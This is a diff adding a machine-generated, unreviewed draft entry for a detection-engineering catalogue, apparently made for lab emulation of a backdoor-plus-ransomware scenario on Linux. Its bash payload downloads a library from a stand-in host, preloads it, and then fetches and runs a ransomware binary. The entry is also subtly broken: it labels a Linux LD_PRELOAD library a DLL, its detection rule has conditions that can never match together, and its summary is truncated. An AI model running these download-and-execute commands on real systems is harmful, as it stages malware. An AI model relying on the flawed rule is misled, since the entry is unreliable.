@@ -1,0 +1,173 @@
+{
+  "id": "TTP-0000-0004",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-linux",
+      "endpoint",
+      "source-not-recorded"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "linux"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "AK47C2 Backdoor with X2ANYLOCK Ransomware Staging via DLL Side-Loading on Linux",
+    "summary": "An attacker uses DLL side-loading to load the AK47C2 backdoor, which then downloads and stages the X2ANYLOCK ransomware encryptor. The backdoor communicates over multiple protocols to C2 and executes ",
+    "description": "An attacker uses DLL side-loading to load the AK47C2 backdoor, which then downloads and stages the X2ANYLOCK ransomware encryptor. The backdoor communicates over multiple protocols to C2 and executes the ransomware payload."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1574",
+        "subtechnique_id": "T1574.002",
+        "name": "Hijack Execution Flow: DLL Side-Loading",
+        "tactic_ids": [
+          "TA0004",
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Privilege Escalation",
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1486",
+        "name": "Data Encrypted for Impact",
+        "tactic_ids": [
+          "TA0040"
+        ],
+        "tactic_names": [
+          "Impact"
+        ]
+      },
+      {
+        "technique_id": "T1071",
+        "subtechnique_id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "root",
+    "payload": {
+      "interpreter": "bash",
+      "code": "wget -O /tmp/libcurl.so https://192.0.2.100/ak47c2.dll\nchmod +x /tmp/libcurl.so\nLD_PRELOAD=/tmp/libcurl.so /usr/bin/python3 -c \"import os; os.system('wget -O /tmp/x2anylock https://192.0.2.100/x2anylock && chmod +x /tmp/x2anylock && /tmp/x2anylock')\"\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "file",
+        "description": "AK47C2 backdoor DLL loaded via side-loading",
+        "expected_value": "action_file_path = '/tmp/libcurl.so'"
+      },
+      {
+        "artifact_type": "process",
+        "description": "Python process executing the side-loaded DLL",
+        "expected_value": "action_process_image_name = 'python3'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "C2 communication to 192.0.2.100",
+        "expected_value": "action_remote_ip = '192.0.2.100'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "DLL Side-Loading via LD_PRELOAD",
+        "description": "Detection of process starting with LD_PRELOAD environment variable and loading of suspicious DLL",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter process_env_vars contains 'LD_PRELOAD'\n| filter process_image_path contains 'python3'\n| filter process_image_path contains 'libcurl.so'",
+        "mitre_technique_ids": [
+          "T1574.002"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Process Start with LD_PRELOAD",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter process_env_vars contains 'LD_PRELOAD'\n| filter process_image_path contains 'python3'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": []
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "MITRE ATT&CK T1574.002",
+      "url": "https://attack.mitre.org/techniques/T1574/002/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1486",
+      "url": "https://attack.mitre.org/techniques/T1486/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1071.001",
+      "url": "https://attack.mitre.org/techniques/T1071/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
